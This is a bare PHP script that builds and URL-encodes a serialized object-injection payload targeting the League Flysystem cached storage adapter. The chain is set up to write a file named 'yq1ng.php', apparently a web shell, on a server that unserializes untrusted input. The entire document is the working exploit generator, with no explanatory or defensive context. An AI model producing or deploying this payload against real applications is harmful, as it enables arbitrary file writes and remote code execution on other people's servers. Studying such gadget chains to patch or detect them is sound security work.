<?php
namespace League\Flysystem\Cached\Storage {
	use League\Flysystem\Adapter\Local;
	class Adapter {
		protected $autosave = true;
		protected $expire = null;
		protected $adapter;
		protected $file;
		public function __construct() {
			$this->autosave = false;
			$this->expire = '';
			$this->adapter = new Local();
			$this->file = 'yq1ng.php';
		}
	}
}
namespace League\Flysystem\Adapter {
	class Local {
	}
}
namespace {
	use League\Flysystem\Cached\Storage\Adapter;
	echo urlencode(serialize(new Adapter()));
}
